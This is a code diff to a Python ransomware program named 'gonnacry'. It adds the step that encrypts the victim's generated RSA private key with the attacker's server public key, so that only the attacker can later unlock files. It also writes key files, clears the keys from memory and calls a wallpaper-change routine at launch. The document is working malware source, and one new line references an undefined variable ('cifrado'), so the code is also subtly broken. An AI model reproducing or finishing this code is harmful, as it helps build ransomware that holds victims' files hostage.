@@ -11,7 +11,7 @@ from Crypto.PublicKey import RSA
 import gc
 from Crypto.Hash import MD5
 import base64
-
+import pickle
 
 # const variables
 server_public_key = ("""-----BEGIN PUBLIC KEY-----
@@ -54,7 +54,18 @@ u7KSAN0pGuIw57saMWU1KFy2POKHI8+PP4rGeJhKx6isAt+3ZFk=
 
 ransomware_name = ("gonnacry")
 
+def encrypt_priv_key(msg, key):
+    line = msg
+    n = 127
+    x = [line[i:i+n] for i in range(0, len(line), n)]
 
+    key = RSA.importKey(key)
+    cipher = PKCS1_OAEP.new(key)
+    cifrado = []
+    for i in x:
+        ciphertext = cipher.encrypt(i)
+        cifrado.append(ciphertext)
+    return cifrado
 
 def shred(file_name,  passes=1):
 
@@ -133,44 +144,23 @@ def menu():
 
     Client_private_key = rsa_object.private_key_PEM
     Client_public_key = rsa_object.public_key_PEM
-    print(Client_private_key)
-    # encrypt the client private key with servers public key
-
-    chunk = 127
-    splitted = [Client_private_key[i:i+chunk] for i in range(0, len(Client_private_key), chunk)]
-
-    cipher = PKCS1_OAEP.new(server_public_key_object)
-    encrypted_parts = []
-    for i in splitted:
-        ciphertext = cipher.encrypt(i)
-        encrypted_parts.append(ciphertext)
-
-    #encrypted_parts
-
-
-    # print(encrypted_private_key)
-
-    # with open(ransomware_path + "encrypted_private_key", 'wb') as f:
-    #     f.write(encrypted_private_key)
-
-    # with open(ransomware_path + "client_public_key", 'wb') as f:
-    #     f.write(Client_public_key)
+    encrypted_client_private_key = encrypt_priv_key(Client_private_key, server_public_key)
     
-    # # Free the memory from keys
-    # Client_private_key = None
-    # Client_public_key = None 
-    # rsa_object = None
-    # del rsa_object
-    # gc.collect()
+    with open('encrypted_client_private_key.key', 'wb') as output:
+        pickle.dump(cifrado, output, pickle.HIGHEST_PROTOCOL)
     
-    # # check if keys where desallocated
-
-
-    # # Get the client public key back
-    # with open(ransomware_path + "client_public_key") as f:
-    #     Client_public_key = f.read()
-    # client_public_key_object =  RSA.importKey(Client_public_key)
+    with open(ransomware_path + "client_public_key.PEM", 'wb') as f:
+        f.write(Client_public_key)
     
+    # Free the memory from keys
+    Client_private_key = None
+    rsa_object = None
+    gc.collect()
+    del rsa_object
+    del Client_private_key
+    
+    # Get the client public key back as object
+    client_public_key_object =  RSA.importKey(Client_public_key)
 
     # # ENCRYPTION STARTS HERE !!!
     # aes_keys_and_base64_path = start_encryption(files)
@@ -220,8 +210,5 @@ def change_wallpaper():
 
 if __name__ == "__main__":
     menu()
-
-
-
-
+    change_wallpaper()
 
